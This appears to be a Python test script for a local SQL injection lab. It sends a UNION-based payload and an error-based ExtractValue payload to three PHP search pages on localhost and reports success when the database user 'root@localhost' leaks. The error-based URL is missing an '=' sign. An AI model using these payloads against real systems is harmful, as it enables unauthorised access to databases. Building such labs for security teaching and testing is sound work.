import requests

print("------------------------------------")

def test_correct_functionality(base_url, file_names):
    search = "apple"

    for file_name in file_names:
        url = f"{base_url}/{file_name}?search="+search
        response = requests.get(url)
        #print(response.text)
        
        try:
            assert response.status_code == 200 and search.capitalize() in response.text
            print(f"Functionality worked for {file_name} and item was found")
        except AssertionError:
            print(f"No items found in {file_name}")
    print("------------------------------------")


########## Union Based Injection Testing #############

def test_union_based_injection(base_url, file_names):
    for file_name in file_names:
        search = "' UNION SELECT user(), user() FROM users-- -"
        url = f"{base_url}/{file_name}?search="+search
        response = requests.get(url)
       # print(response.text)
        try:
            assert response.status_code == 200 and "root@localhost" in response.text
            print(f"Union-Based injection passed for {file_name}")
        except AssertionError:
            print(f"Union-Based injection failed for {file_name}")
    print("------------------------------------")

########## Error Based Injection Testing #############

def test_error_based_injection(base_url, file_names):
    for file_name in file_names:
        search = "'a AND ExtractValue(0,CONCAT(0x5c,USER())) -- -"
        url = f"{base_url}/{file_name}?search"+search
        response = requests.get(url)
       # print(response.text)
        try:
            assert response.status_code == 200 and 'root@localhost' in response.text
            print(f"Error-Based injection passed for {file_name}")
        except AssertionError:
            print(f"Error-Based injection failed for {file_name}")
    print("------------------------------------")


base_url = "http://localhost:4000/sqli"
file_names = ["find.php", "find2.php", "find3.php"]

test_correct_functionality(base_url, file_names)
test_union_based_injection(base_url, file_names)
test_error_based_injection(base_url, file_names)
